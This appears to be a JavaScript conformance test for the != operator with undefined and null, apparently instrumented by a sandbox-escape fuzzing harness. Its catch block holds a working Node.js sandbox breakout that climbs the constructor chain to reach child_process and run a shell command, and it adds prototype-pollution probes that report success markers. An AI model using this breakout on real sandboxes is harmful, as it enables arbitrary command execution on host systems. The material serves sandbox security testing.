try {
    if (false != undefined !== true) {
        $ERROR('#1: (false != undefined) === true');
    }
    if (Number.NaN != undefined !== true) {
        $ERROR('#2: (Number.NaN != undefined) === true');
    }
    if ('undefined' != undefined !== true) {
        $ERROR('#3: ("undefined" != undefined) === true');
    }
    if ({} != undefined !== true) {
        $ERROR('#4: ({} != undefined) === true');
    }
    if (false != null !== true) {
        $ERROR('#5: (false != null) === true');
    }
    if (0 != null !== true) {
        $ERROR('#6: (0 != null) === true');
    }
    if ('null' != null !== true) {
        $ERROR('#7: ("null" != null) === true');
    }
    if ({} != null !== true) {
        $ERROR('#8: ({} != null) === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}